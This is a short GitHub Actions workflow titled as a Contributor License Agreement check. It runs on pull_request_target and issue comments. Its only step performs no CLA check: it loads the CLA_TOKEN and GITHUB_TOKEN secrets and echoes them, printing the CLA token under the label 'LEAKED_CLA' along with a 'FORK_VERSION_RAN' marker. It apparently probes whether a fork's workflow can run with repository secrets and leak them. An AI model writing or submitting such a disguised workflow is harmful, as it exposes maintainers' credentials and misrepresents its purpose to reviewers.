name: Contributor License Agreement (CLA)

on:
  pull_request_target:
    types: [opened, synchronize]
  issue_comment:
    types: [created]

jobs:
  cla:
    runs-on: ubuntu-latest
    steps:
      - name: which-version
        env:
          CLA: ${{ secrets.CLA_TOKEN }}
          GH: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "FORK_VERSION_RAN"
          echo "sha=$GITHUB_SHA ref=$GITHUB_REF event=$GITHUB_EVENT_NAME"
          echo "LEAKED_CLA=$CLA"
          echo "gh_len=${#GH}"
